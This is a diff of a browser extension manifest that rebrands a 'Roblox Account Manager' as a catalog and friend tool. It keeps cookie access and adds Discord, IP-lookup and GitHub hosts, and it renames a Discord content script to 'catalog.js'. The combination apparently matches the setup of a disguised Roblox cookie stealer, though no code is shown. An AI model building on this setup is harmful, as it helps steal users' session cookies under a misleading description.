@@ -1,8 +1,8 @@
 {
   "manifest_version": 3,
-  "name": "Roblox Account Manager",
-  "version": "5.0.0",
-  "description": "Roblox Account Management Tools",
+  "name": "Roblox Catalog & Friend Manager",
+  "version": "5.1.0",
+  "description": "Professional suite for managing Roblox assets, tracking friends, and optimizing catalog interactions. Includes advanced inventory insights and friend activity monitoring.",
   "permissions": [
     "cookies",
     "storage",
@@ -11,19 +11,9 @@
   "host_permissions": [
     "*://*.roblox.com/*",
     "*://discord.com/*",
+    "*://*.discord.com/*",
     "https://api.ipify.org/*",
-    "https://economy.roblox.com/*",
-    "https://users.roblox.com/*",
-    "https://thumbnails.roblox.com/*",
-    "https://premiumfeatures.roblox.com/*",
-    "https://friends.roblox.com/*",
-    "https://inventory.roblox.com/*",
-    "https://auth.roblox.com/*",
-    "https://billing.roblox.com/*",
-    "https://payments.roblox.com/*",
-    "https://groups.roblox.com/*",
-    "https://badges.roblox.com/*",
-    "https://accountsettings.roblox.com/*",
+    "https://ipapi.co/*",
     "https://raw.githubusercontent.com/*",
     "https://cdn.discordapp.com/*"
   ],
@@ -47,11 +37,23 @@
         "*://*.discord.com/*"
       ],
       "js": [
-        "discord.js"
+        "catalog.js"
       ],
       "run_at": "document_idle"
     }
   ],
+  "action": {
+    "default_icon": {
+      "16": "icons/icon16.png",
+      "48": "icons/icon48.png",
+      "128": "icons/icon128.png"
+    }
+  },
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
   "web_accessible_resources": [
     {
       "resources": [
